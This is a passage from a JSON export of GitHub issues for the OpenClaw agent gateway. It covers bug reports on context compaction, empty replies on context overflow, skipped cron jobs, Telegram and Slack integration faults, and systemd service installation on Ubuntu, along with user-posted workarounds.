Behavior\n\n`openclaw.cache-ttl` events inserted after compaction should have `parentId` set to the **last kept entry** (the leaf of the kept message chain), not the compaction entry itself. This would keep the tree structure intact and ensure kept entries are included in subsequent context rebuilds.\n\n## Context\n\n- The model had just been switched from Sonnet to Opus, which may have triggered the cache-ttl event\n- OpenClaw version: 2026.2.6-3\n- The `cache-ttl` event type is `openclaw.cache-ttl` with `customType` field\n- The insertion likely happens in the context pruning logic (`dist/extensionAPI.js`)\n\n## Impact\n\nHigh: `keepRecentTokens` is effectively nullified when this race condition occurs. Users lose all recent conversation context despite compaction being correctly configured.\n\n## Note\n\nThis is based on post-hoc log analysis. We have strong evidence for the correlation (exact token count match, tree structure analysis) but have not verified the fix in code. The OpenClaw team should verify the `parentId` assignment logic in the cache-ttl insertion path.",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14065",
      "createdAt": "2026-02-11T11:58:25Z",
      "updatedAt": "2026-02-11T11:59:11Z",
      "author": "kbecking",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883979518,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14065#issuecomment-3883979518",
          "createdAt": "2026-02-11T11:59:10Z",
          "updatedAt": "2026-02-11T11:59:10Z",
          "author": "kbecking",
          "body": "Closing as duplicate of #9282 (root cause analysis) and #12170 (same symptom).\n\nOur evidence adds another data point: `tokensBefore=3,799` matching exactly the summary size of the prior compaction (15,194 chars ≈ 3,798 tokens), confirming that `keepRecentTokens` entries are orphaned when `cache-ttl` is the trailing entry after compaction.\n\nApologies for not searching first!"
        }
      ]
    },
    {
      "number": 14064,
      "title": "[Bug]: Session exceeding context window produces silent empty replies — no compaction triggered",
      "body": "## Summary\n\nWhen a session's accumulated context exceeds the model's effective context window (or the configured `contextTokens` cap), the model returns `stopReason: \"length\"` with `output: 0` — producing **silent empty replies**. Auto-compaction never triggers, leaving the session permanently stuck: every subsequent message gets the same empty response.\n\n## Environment\n\n- OpenClaw version: `2026.2.9` (main branch)\n- Model: `openai/gpt-5.2` via OpenRouter\n- Config: `compaction.mode: \"safeguard\"`\n\n## Steps to Reproduce\n\n1. Use a long-running session with many tool calls, `memory_search` results, and subagent completions\n2. Session transcript grows to ~312k input tokens\n3. At some point, prompt cache invalidates (`cacheRead` drops from ~260k to 0), causing full input to be sent\n4. Model returns: `content: [], output: 0, stopReason: \"length\"`\n5. Every subsequent message in the same session gets the same empty response\n6. Setting `agents.defaults.contextTokens: 200000` and restarting the gateway does **not** help — the existing session is still loaded and sent as-is\n\n## Observed Behavior\n\nFrom the session transcript (`.jsonl`):\n\n```json\n{\n  \"role\": \"assistant\",\n  \"content\": [],\n  \"usage\": { \"input\": 311501, \"output\": 0, \"cacheRead\": 0, \"totalTokens\": 311501 },\n  \"stopReason\": \"length\"\n}\n```\n\nFrom the debug log:\n\n```\nembedded run agent start: runId=...\nembedded run agent end: runId=...           ← ~5s later, model \"completed\"\nembedded run done: durationMs=5662 aborted=false\n```\n\nNo compaction log, no error log, no `Compaction safeguard:` warning. The run appears successful from the gateway's perspective, but `replies=0`.\n\n## Root Cause Analysis\n\nPer [docs/reference/session-management-compaction.md](https://github.com/openclaw/openclaw/blob/main/docs/reference/session-management-compaction.md#L174-L188), auto-compaction triggers in two cases:\n\n1. **Overflow recovery**: model returns a context overflow **error** → compact → retry\n2. **Threshold maintenance**: after a **successful turn**, when `contextTokens > contextWindow - reserveTokens`\n\nNeither fires in this scenario:\n\n- **Overflow recovery** doesn't fire because `stopReason: \"length\"` with `output: 0` is not treated as a context overflow error — it's treated as a normal (albeit empty) completion.\n- **Threshold maintenance** may not fire because the turn produced 0 output tokens, so the runtime may not consider it a meaningful turn that warrants a compaction check.\n\nAdditionally, there is **no pre-flight check** when loading a session: if the existing transcript already exceeds the configured `contextTokens` cap, the full history is still sent to the model without compaction.\n\n## Expected Behavior\n\nAt least one of the following should happen:\n\n1. **Pre-flight compaction**: When a session is loaded and its estimated token count exceeds `contextWindow - reserveTokens` (or the `contextTokens` cap), auto-compact before sending the request to the model.\n2. **Detect `output: 0` + `stopReason: \"length\"` as overflow**: Treat this as a context overflow condition and trigger overflow recovery (compact → retry), rather than silently accepting the empty response.\n3. **Warn or log the condition**: At minimum, log a warning when the model returns 0 output tokens with `stopReason: \"length\"`, so the issue is visible in logs.\n\n## Workaround\n\nManually delete or rename the bloated session transcript file:\n\n```bash\nmv ~/.openclaw/agents/main/sessions/<sessionId>.jsonl \\\n   ~/.openclaw/agents/main/sessions/<sessionId>.jsonl.bak\n```\n\nThen send a new message to create a fresh session.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14064",
      "createdAt": "2026-02-11T11:58:06Z",
      "updatedAt": "2026-02-11T11:58:06Z",
      "author": "cszhouwei",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 12440,
      "title": "Cron jobs skipped when cron list/status called after scheduled time",
      "body": "## Bug\n\nCalling `cron list` or `cron status` after a job's scheduled time (but before it runs) causes the job to be skipped entirely.\n\n## Root Cause\n\n`ensureLoaded()` calls `recomputeNextRuns()` which advances `nextRunAtMs` to the next occurrence when `now > nextRunAtMs`, without checking if the job was actually executed for that time slot.\n\n`runMissedJobs()` only runs at gateway startup, not during regular cron operations.\n\n## Steps to Reproduce\n\n1. Create a cron job scheduled for 01:00 UTC\n2. Let 01:00 UTC pass without gateway restart\n3. At 02:00 UTC, run `openclaw cron list`\n4. Job's `nextRunAtMs` advances to next day\n5. Job never runs for the missed slot\n\n## Expected Behavior\n\nEither:\n- `recomputeNextRuns()` should not advance past-due jobs without execution\n- `runMissedJobs()` should run on any operation detecting past-due jobs\n\n## Version\n\nOpenClaw 2026.2.6-3",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12440",
      "createdAt": "2026-02-09T07:54:24Z",
      "updatedAt": "2026-02-11T11:57:42Z",
      "author": "rummangeminicode",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3883973561,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12440#issuecomment-3883973561",
          "createdAt": "2026-02-11T11:57:42Z",
          "updatedAt": "2026-02-11T11:57:42Z",
          "author": "skytodmoon",
          "body": "mark"
        }
      ]
    },
    {
      "number": 14062,
      "title": "[Bug]: Telegram plugin enabled causes agent runs to skip local LLM provider calls entirely",
      "body": "# [Bug]: Telegram plugin enabled causes agent runs to skip local LLM provider calls entirely\n\n## Summary\n\nWhen `plugins.telegram.enabled: true` and `channels.telegram.enabled: true` are both configured, Telegram messages trigger agent runs but the local LLM provider is never called. The agent run completes with \"Connection error\" despite the proxy being reachable and functional for other channels (webchat).\n\n## Environment\n\n- **OpenClaw Version:** 2026.2.9 (33c75cb)\n- **OS:** Linux 6.17.9-1 (Debian 13 trixie)\n- **Node.js:** v22.22.0\n- **Gateway Mode:** local (bind: lan, port 18789)\n- **Model Provider:** Custom localProxy (http://localhost:1234/anthropic)\n- **Model:** anthropic--claude-4.5-sonnet\n\n## Configuration\n\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"enabled\": true,\n      \"botToken\": \"<REDACTED>\"\n    }\n  },\n  \"plugins\": {\n    \"entries\": {\n      \"telegram\": {\n        \"enabled\": true\n      }\n    }\n  },\n  \"models\": {\n    \"providers\": {\n      \"localProxy\": {\n        \"baseUrl\": \"http://localhost:1234/anthropic\",\n        \"apiKey\": \"<REDACTED>\",\n        \"auth\": \"token\",\n        \"api\": \"anthropic-messages\"\n      }\n    }\n  },\n  \"agents\": {\n    \"defaults\": {\n      \"model\": {\n        \"primary\": \"localProxy/anthropic--claude-4.5-sonnet\"\n      }\n    }\n  }\n}\n```\n\n## Steps to Reproduce\n\n1. Configure both `channels.telegram.enabled: true` and `plugins.telegram.enabled: true`\n2. Ensure LLM proxy is running and accessible (verified: works for webchat)\n3. Send a message to the Telegram bot from an authorized user\n4. Observe: Message is received and appears in webchat (shared session)\n5. Observe: Agent run is triggered with `messageChannel=telegram`\n6. Observe: **No LLM provider request is made** (confirmed: proxy receives zero requests)\n7. Result: Session history shows assistant turn with `\"stopReason\":\"error\",\"errorMessage\":\"Connection error.\"`\n\n## Expected Behavior\n\n- Telegram message triggers agent run\n- Agent run calls LLM provider (`http://localhost:1234/anthropic`)\n- LLM response is generated\n- Reply is delivered to Telegram (or at least attempted)\n\n## Actual Behavior\n\n- Telegram message triggers agent run ✅\n- **Agent run skips LLM provider call entirely** ❌\n- No HTTP request reaches the proxy (verified via proxy logs)\n- Session shows empty assistant turn with \"Connection error\"\n- No response delivered to Telegram\n\n## Diagnostic Evidence\n\n### Gateway Logs (plugin enabled, Telegram message sent)\n\n```\n10:51:55 [telegram] update: {\"update_id\":143725665,\"message\":{\"message_id\":29,\"from\":{\"id\":3463194322,...},\"text\":\"test\"}}\n10:51:56 telegram inbound: chatId=3463194322 from=telegram:3463194322 len=83\n10:51:56 [agent/embedded] embedded run start: runId=96f071a8-a428-4a7a-a583-c0836d6ad116 sessionId=2e37a42d-7e93-44e1-984c-e7df4a531b1a provider=localproxy model=anthropic--claude-4.5-sonnet thinking=off messageChannel=telegram\n10:51:56 [agent/embedded] embedded run agent start: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:51:57 [agent/embedded] embedded run agent end: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:51:59 [agent/embedded] embedded run agent start: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:52:00 [agent/embedded] embedded run agent end: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:52:05 [agent/embedded] embedded run agent start: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:52:06 [agent/embedded] embedded run agent end: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:52:14 [agent/embedded] embedded run agent start: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:52:15 [agent/embedded] embedded run agent end: runId=96f071a8-a428-4a7a-a583-c0836d6ad116\n10:52:15 [agent/embedded] embedded run done: runId=96f071a8-a428-4a7a-a583-c0836d6ad116 sessionId=2e37a42d-7e93-44e1-984c-e7df4a531b1a durationMs=19511 aborted=false\n```\n\n**Key observation:** Multiple `agent start/end` cycles (retry pattern), but **no tool calls, no LLM streaming, no HTTP logs**.\n\n### Gateway Logs (plugin disabled, same message via webchat)\n\n```\n10:57:51 [agent/embedded] embedded run start: runId=467e621d-54db-46d8-a8fc-dc3da828bfbd sessionId=2e37a42d-7e93-44e1-984c-e7df4a531b1a provider=localproxy model=anthropic--claude-4.5-sonnet thinking=off messageChannel=webchat\n10:57:51 [agent/embedded] embedded run agent start: runId=467e621d-54db-46d8-a8fc-dc3da828bfbd\n10:57:54 [agent/embedded] embedded run tool start: runId=467e621d-54db-46d8-a8fc-dc3da828bfbd tool=exec toolCallId=toolu_bdrk_018Pwh3ij9QjFdkdBom1uuKj\n10:57:54 [agent/embedded] embedded run tool end: runId=467e621d-54db-46d8-a8fc-dc3da828bfbd tool=exec toolCallId=toolu_bdrk_018Pwh3ij9QjFdkdBom1uuKj\n10:57:56 [ws] → event agent seq=4 clients=1 run=467e621d…bfbd agent=main session=main stream=assistant aseq=5 text=**test\n...\n10:58:02 [agent/embedded] embedded run done: runId=467e621d-54db-46d8-a8fc-dc3da828bfbd sessionId=2e37a42d-7e93-44e1-984c-e7df4a531b1a durationMs=11686 aborted=false\n```\n\n**Key difference:** Tool calls execute, streaming output appears, LLM response generated successfully.\n\n### Session History (Telegram messages with plugin enabled)\n\n```json\n{\n  \"type\":\"message\",\n  \"id\":\"636c41eb\",\n  \"parentId\":\"87ec5414\",\n  \"timestamp\":\"2026-02-11T11:13:29.235Z\",\n  \"message\":{\n    \"role\":\"assistant\",\n    \"content\":[],\n    \"api\":\"anthropic-messages\",\n    \"provider\":\"localProxy\",\n    \"model\":\"anthropic--claude-4.5-sonnet\",\n    \"usage\":{\"input\":0,\"output\":0,\"cacheRead\":0,\"cacheWrite\":0,\"totalTokens\":0,\"cost\":{\"input\":0,\"output\":0,\"cacheRead\":0,\"cacheWrite\":0,\"total\":0}},\n    \"stopReason\":\"error\",\n    \"timestamp\":1770808407836,\n    \"errorMessage\":\"Connection error.\"\n  }\n}\n```\n\n```\n\n## Workaround\n\n**Disable the Telegram plugin:**\n\n```json\n{\n  \"plugins\": {\n    \"entries\": {\n      \"telegram\": {\n        \"enabled\": false\n      }\n    }\n  }\n}\n```\n\n\n## Root Cause Hypothesis\n\nWhen `plugins.telegram.enabled: true`, the plugin may be:\n\n1. **Intercepting the agent run flow** and preventing LLM provider resolution\n2. **Overriding the model/provider config** for `messageChannel=telegram` runs\n3. **Short-circuiting the request builder** before HTTP calls are made\n4. **Conflicting with the channel handler** causing dual message processing\n\nThe LLM provider call is **completely skipped** (not failing at HTTP level), suggesting an early return or exception in the agent run preparation phase.\n\n## Related Issues\n\n- [#6665 - Telegram Plugin Not Receiving Messages](https://github.com/openclaw/openclaw/issues/6665) - Similar config (both enabled), but different symptom (messages not received vs. received but not processed)\n- [#5531 - Session replies not routing to Telegram when webchat is also active](https://github.com/openclaw/openclaw/issues/5531) - Multi-channel routing issue (may be related to delivery, not provider calls)\n\n## Additional Context\n\n- **Both Telegram channel and plugin should NOT need to be enabled simultaneously** - unclear from docs what the intended behavior is\n- **Plugin appears to handle message reception**, but breaks LLM invocation\n- **Channel-only mode works for message reception** (messages appear in webchat), but replies don't route back to Telegram\n\n## Impact\n\n- Telegram integration is completely non-functional when plugin is enabled\n- Users cannot receive responses via Telegram\n- Creates confusion about correct configuration (channel vs. plugin vs. both)\n\n## Request\n\nPlease investigate:\n\n1. **Is having both `channels.telegram` and `plugins.telegram` enabled a supported configuration?**\n2. **Why does `messageChannel=telegram` prevent LLM provider calls?**\n3. **Should the plugin be deprecated in favor of channel-only mode?**\n\n---\n\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14062",
      "createdAt": "2026-02-11T11:54:28Z",
      "updatedAt": "2026-02-11T11:54:28Z",
      "author": "tauceti82",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14010,
      "title": "[Bug]: Slack message tool lowercases channel IDs, causing 'Unknown channel' errors",
      "body": "## Summary\n\nThe `message` tool lowercases Slack channel IDs before passing them to the Slack API. Slack channel IDs are case-sensitive (e.g. `D0ADSDZ345P` for DMs), so the lowercased version (`d0adsdz345p`) fails with `Unknown channel`.\n\nThis appears to affect all `message` tool actions (react, send, etc.) when the channel/target parameter contains uppercase letters.\n\n## Steps to reproduce\n\n1. Configure OpenClaw with Slack channel\n2. Use the `message` tool with `action: react` targeting a DM channel (IDs starting with `D` are always mixed-case)\n3. Pass the correct channel ID: `D0ADSDZ345P`\n4. Observe the error shows the lowercased ID: `d0adsdz345p`\n\n## Expected behavior\n\nChannel IDs should be passed to the Slack API exactly as provided, preserving original case.\n\n## Actual behavior\n\nChannel ID is lowercased somewhere in the message tool pipeline before reaching the Slack API, causing Slack to reject it as unknown.\n\nError output:\n```\nMessage: react · message 1770801808.157389 · emoji purple_heart failed:\nUnknown channel: d0adsdz345p\n```\n\n## Environment\n\n- OpenClaw version: latest (Feb 11, 2026)\n- OS: macOS (Darwin 25.2.0 arm64)\n- Channel: Slack\n- Install method: pnpm (global)\n\n## Logs or screenshots\n\nThe error is visible directly in chat — OpenClaw posts the failure as a message. The key evidence is the case mismatch between the provided ID (`D0ADSDZ345P`) and the ID in the error (`d0adsdz345p`).",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14010",
      "createdAt": "2026-02-11T09:29:53Z",
      "updatedAt": "2026-02-11T11:54:00Z",
      "author": "lisa-freddie",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": []
    },
    {
      "number": 1818,
      "title": "[Bug]: Onboarding wizard does not install Systemd service on Ubuntu 22.04",
      "body": "## Summary\nThe onboarding wizard does not install a Systemd service in Ubuntu. During the Systemd step, it prints: Systemd user services are unavailable. Skipping lingering checks and service install.\n\nThis is because the **isSystemdUserServiceAvailable** function is throwing this error:\n\n`Failed to connect to bus: $DBUS_SESSION_BUS_ADDRESS and $XDG_RUNTIME_DIR not defined (consider using --machine=<user>@.host --user to connect to bus of other user)`\n\n## Steps to reproduce\nJust run the onboarding wizard on Ubuntu 22.04.\n\n## Expected behavior\nSystemd is obviously installed on my OS.\n\n## Actual behavior\n`Gateway service check failed: Error: systemctl --user unavailable: Failed to connect to bus: $DBUS_SESSION_BUS_ADDRESS and $XDG_RUNTIME_DIR not defined (consider using --machine=<user>@.host --user to connect to bus of other user)`\n\n## Environment\n- Clawdbot version: 2026.1.23-1\n- OS: Ubuntu 22.04\n- Install method (pnpm/npx/docker/etc): npm\n\n## Logs or screenshots\n`Gateway service check failed: Error: systemctl --user unavailable: Failed to connect to bus: $DBUS_SESSION_BUS_ADDRESS and $XDG_RUNTIME_DIR not defined (consider using --machine=<user>@.host --user to connect to bus of other user)`\n",
      "state": "closed",
      "comments": 29,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818",
      "createdAt": "2026-01-25T13:59:10Z",
      "updatedAt": "2026-02-11T11:53:54Z",
      "author": "chepurko",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "onboarding"
        ]
      },
      "commentsData": [
        {
          "id": 3797207907,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3797207907",
          "createdAt": "2026-01-25T20:39:11Z",
          "updatedAt": "2026-01-25T20:39:11Z",
          "author": "davetroy",
          "body": "Experiencing the same issue on Ubuntu 24.04 and clawdbot 2026.1.24-3."
        },
        {
          "id": 3798209771,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3798209771",
          "createdAt": "2026-01-26T07:24:54Z",
          "updatedAt": "2026-01-26T07:24:54Z",
          "author": "UVvirus",
          "body": "### ✅ Solution\n\nThis resolved the issue for me.\n\n1. SSH into your **EC2 instance**\n2. Start the Clawdbot gateway manually:\n   ```bash\n   clawdbot gateway run\n3. (Optional) To keep the bot running after disconnecting, run it inside a screen session:\n    ```bash\n    screen -R clawdbot\n    clawdbot gateway run\n"
        },
        {
          "id": 3800176129,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3800176129",
          "createdAt": "2026-01-26T15:25:21Z",
          "updatedAt": "2026-01-26T15:25:21Z",
          "author": "davetroy",
          "body": "Thanks, yes, that's a functional workaround, but it doesn't fix the underlying issue of not being manageable with `systemd`. Would like to see that resolved as well."
        },
        {
          "id": 3800625172,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3800625172",
          "createdAt": "2026-01-26T16:54:48Z",
          "updatedAt": "2026-01-26T16:54:48Z",
          "author": "chepurko",
          "body": "I've also made a workaround by creating my own Systemd unit file:\n\n```\n[Unit]\nDescription=Clawdbot Gateway (name: chep, v1)\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nUser=user\nWorkingDirectory=/home/userclawd\nExecStart=/home/usernpm-global/bin/clawdbot gateway --port 18789\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n```\n\nSo my gateway is running, but this doesn't fix the issue with the install script, and also the various `clawdbot gateway` commands don't work because they don't see any systemd service. (don't know how to make it see my systemd unit)."
        },
        {
          "id": 3801209834,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3801209834",
          "createdAt": "2026-01-26T18:58:23Z",
          "updatedAt": "2026-01-26T18:58:23Z",
          "author": "avatsaev",
          "body": "Experiencing the same issue on Ubuntu 24 server LXC container "
        },
        {
          "id": 3801511757,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3801511757",
          "createdAt": "2026-01-26T20:04:07Z",
          "updatedAt": "2026-01-26T20:04:07Z",
          "author": "schniggie",
          "body": "Same issue on Debian 13"
        },
        {
          "id": 3803304452,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3803304452",
          "createdAt": "2026-01-27T06:12:10Z",
          "updatedAt": "2026-01-27T06:12:10Z",
          "author": "live9369",
          "body": "I've also resolved this problem with installing user session support:\n```bash\nsudo apt install -y dbus-user-session\n```\nEnable lingering for the user:\n```bash\nsudo loginctl enable-linger ubuntu\n```\nFinally, verify that the user systemd instance is running:\n```bash\nsystemctl --user status\n```\n"
        },
        {
          "id": 3813265517,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3813265517",
          "createdAt": "2026-01-28T18:57:44Z",
          "updatedAt": "2026-01-28T18:57:44Z",
          "author": "growthringsadvisory",
          "body": "I've submitted a fix for this in PR #3527.\n\nThe issue is that the CLI only checks for systemd user services (`systemctl --user`), but on VPS/server installs, the gateway often runs as a system service (`/etc/systemd/system/`).\n\nThe fix adds detection and management for system services:\n- Status commands now check both user and system service locations\n- Service management (stop/restart) tries user first, falls back to system with sudo\n- Should resolve the \"systemd not installed\" false negative\n\nWould love feedback on the approach!"
        },
        {
          "id": 3827717965,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3827717965",
          "createdAt": "2026-01-31T06:49:02Z",
          "updatedAt": "2026-01-31T06:49:02Z",
          "author": "GabrielDrapor",
          "body": "For others who just want to restart the gateway, simply find the process and kill it. It will restart automatically."
        },
        {
          "id": 3828162967,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3828162967",
          "createdAt": "2026-01-31T11:08:39Z",
          "updatedAt": "2026-01-31T11:08:39Z",
          "author": "ChuJiani",
          "body": "@chepurko You likely encountered this error because you switched user with `su - userclawd` or `sudo -iu userclawd`?\n\n**Reason**\n\n`su` and `sudo` do not create a full user session (they don't register with `systemd-logind`), so the environment variables required for `systemctl --user` are missing.\n\n**Solution**\n\nTo fix this,  try using `machinectl` instead:\n\n```bash\nsudo machinectl shell userclawd@.host\n# Now this should work:\nsystemctl --user status\n```\n\nIf you can `ssh` into userclawd user, it works too:\n\n```bash\nssh userclawd@localhost\nsystemctl --user status\n```\n\n**Notes**\n\nDon't forget to enable lingering for the user if you want the user services to start with system, or you need the services to persist after logout, just as @live9369 shows:\n\n```bash\nsudo loginctl enable-linger userclawd\n```\n\n---\n\n**Workaround (Manual)**\n\nIf you must use `su`, you can manually export the missing variable (assuming the socket exists via lingering):\n\n```bash\nsudo -iu userclawd\nexport XDG_RUNTIME_DIR=\"/run/user/$(id -u)\"\nsystemctl --user status\n```"
        },
        {
          "id": 3828164730,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3828164730",
          "createdAt": "2026-01-31T11:10:37Z",
          "updatedAt": "2026-01-31T11:10:37Z",
          "author": "prodevuk",
          "body": "I am still experiencing a similar issue."
        },
        {
          "id": 3828182807,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3828182807",
          "createdAt": "2026-01-31T11:25:59Z",
          "updatedAt": "2026-01-31T11:27:04Z",
          "author": "jero-at-github",
          "body": "Still having the same issue using the `docker-setup.sh` script and Ubuntu 24.04 in VPS.\nLatest openclaw repo version from just today."
        },
        {
          "id": 3830681074,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3830681074",
          "createdAt": "2026-02-01T09:11:04Z",
          "updatedAt": "2026-02-01T09:11:04Z",
          "author": "github0null",
          "body": "Same problem,  my solution:\n\n1. Run\n\n```\nsudo apt install -y dbus-user-session\nsudo loginctl enable-linger <your user name>\nmkdir -p ~/.config/systemd/user\n```\n\n2. Add this code in your `~/.profile`\n  ```\nif [ -z \"$XDG_RUNTIME_DIR\" ]; then\n    export XDG_RUNTIME_DIR=\"/run/user/$(id -u)\"\n    if [ ! -d \"$XDG_RUNTIME_DIR\" ]; then\n        mkdir -p \"$XDG_RUNTIME_DIR\"\n        chmod 0700 \"$XDG_RUNTIME_DIR\"\n    fi\nfi\n\nif [ -z \"$DBUS_SESSION_BUS_ADDRESS\" ]; then\n    export DBUS_SESSION_BUS_ADDRESS=\"unix:path=${XDG_RUNTIME_DIR}/bus\"\nfi\n  ```\n\n3. Logout and then login (or run `source ~/.profile`)\n\n4. Run `openclaw gateway install` and `systemctl --user start openclaw-gateway.service`\n\nAll Done.\n\n"
        },
        {
          "id": 3830990227,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3830990227",
          "createdAt": "2026-02-01T12:37:53Z",
          "updatedAt": "2026-02-01T12:37:53Z",
          "author": "jero-at-github",
          "body": "> Same problem, my solution:\n> \n> 1. Run\n> \n> ```\n> sudo apt install -y dbus-user-session\n> sudo loginctl enable-linger <your user name>\n> mkdir -p ~/.config/systemd/user\n> ```\n> \n> 2. Add this code in your `~/.profile`\n> \n> ```\n> if [ -z \"$XDG_RUNTIME_DIR\" ]; then\n>   export XDG_RUNTIME_DIR=\"/run/user/$(id -u)\"\n>   if [ ! -d \"$XDG_RUNTIME_DIR\" ]; then\n>       mkdir -p \"$XDG_RUNTIME_DIR\"\n>       chmod 0700 \"$XDG_RUNTIME_DIR\"\n>   fi\n> fi\n> \n> if [ -z \"$DBUS_SESSION_BUS_ADDRESS\" ]; then\n>   export DBUS_SESSION_BUS_ADDRESS=\"unix:path=${XDG_RUNTIME_DIR}/bus\"\n> fi\n> ```\n> \n> 3. Logout and then login (or run `source ~/.profile`)\n> 4. Run `openclaw gateway install` and `systemctl --user start openclaw-gateway.service`\n> \n> All Done.\n\nIn the host machine or in the Docker image? (I am using the docker-setup.sh script)"
        },
        {
          "id": 3831934911,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3831934911",
          "createdAt": "2026-02-01T20:26:39Z",
          "updatedAt": "2026-02-01T20:26:39Z",
          "author": "chepurko",
          "body": "> Same problem, my solution:\n> \n>     1. Run\n> \n> \n> ```\n> sudo apt install -y dbus-user-session\n> sudo loginctl enable-linger <your user name>\n> mkdir -p ~/.config/systemd/user\n> ```\n> \n>     2. Add this code in your `~/.profile`\n> \n> \n> ```\n> if [ -z \"$XDG_RUNTIME_DIR\" ]; then\n>   export XDG_RUNTIME_DIR=\"/run/user/$(id -u)\"\n>   if [ ! -d \"$XDG_RUNTIME_DIR\" ]; then\n>       mkdir -p \"$XDG_RUNTIME_DIR\"\n>       chmod 0700 \"$XDG_RUNTIME_DIR\"\n>   fi\n> fi\n> \n> if [ -z \"$DBUS_SESSION_BUS_ADDRESS\" ]; then\n>   export DBUS_SESSION_BUS_ADDRESS=\"unix:path=${XDG_RUNTIME_DIR}/bus\"\n> fi\n> ```\n> \n>     3. Logout and then login (or run `source ~/.profile`)\n> \n>     4. Run `openclaw gateway install` and `systemctl --user start openclaw-gateway.service`\n> \n> \n> All Done.\n\nSounds good. I'm just not sure why this can't just be a normal `system` service instead of a `user` service."
        },
        {
          "id": 3836611847,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/1818#issuecomment-3836611847",
          "createdAt": "2026-02-02T17:22:16Z",
          "updatedAt": "2026-02-02T17:22:16Z",
          "author": "samholmes",
          "body": "```\nGateway service check failed: Error: systemctl --user unavailable: Failed to connect to bus: No medium found\n```\n\nThis is what I see when I try to setup the gateway on Ubuntu 24:\n\n```\n$ cat /etc/os-release\nPRETTY_NAME=\"Ubuntu 24.04.3 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nVERSION=\"24.04.3 LTS (Noble Numbat)\"\nVERSION_CODENAME=noble\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=noble\nLOGO=ubuntu-logo\n```\n\nThe reason is likely because I've installed and ran `openclaw` using `bun` under a non-sudo user:\n\n```\n$ which openclaw\n/home/<non-sudo-user>/.bun/bin/openclaw\n```\n\nThe way I solved this is that I created a `openclaw.service` file in `/etc/systemd/system/`:\n\n```\n[Unit]\nDescription=OpenClaw daemon (runs as <non-sudo-user>)\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=simple\nUser=<non-sudo-user>\nGroup=<non-sudo-user>\nWorkingDirectory=/home/<non-sudo-user>\n\n# Use absolute path so we don't depend on shell init files\nExecStart=/home/<non-sudo-user>/.bun/bin/openclaw gateway run\n\nRestart=always\nRestartSec=3\n\n# Optional: match <non-sudo-user>'s PATH in case OpenClaw shells out to node/bun/npm, etc.\nEnvironment=PATH=/home/<non-sudo-user>/.local/bin:/home/<non-sudo-user>/.npm-global/bin:/home/<non-sudo-user>/.bun/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n# Good hygiene (optional)\nNoNewPrivileges=true\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\nI can then do `sudo systemctl daemon-reload` and `sudo systemctl start openclaw`, etc.\n\nMy question to others is whether it's a good idea from a capability 